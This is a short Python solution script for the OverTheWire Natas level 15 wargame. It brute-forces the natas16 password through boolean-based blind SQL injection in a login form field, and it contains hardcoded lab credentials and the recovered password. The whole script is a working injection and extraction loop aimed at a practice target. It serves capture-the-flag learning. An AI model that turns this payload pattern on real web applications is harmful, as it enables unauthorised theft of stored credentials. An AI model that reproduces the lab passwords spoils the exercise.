import requests
import string,re

username="natas15"
password="AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J"

url=str("http://%s.natas.labs.overthewire.org" %username)
passwr=[]
vocabulaire=string.ascii_uppercase+string.ascii_lowercase+string.digits
while(True):
    for ele in vocabulaire:
        r=requests.post(url,auth=(username,password),data={'username':'natas16" and BINARY password LIKE "'+''.join(passwr)+ele+'%" #'})
        if re.findall("This user doesn't exist",r.text):
            print("Waiting........",''.join(passwr)+ele)
        else:
            passwr+=[ele]
            print("good........", ''.join(passwr) + ele)
# The password for natas16 is WaIHEacj63wnNIBROHeqi3p9t0m5nhmh

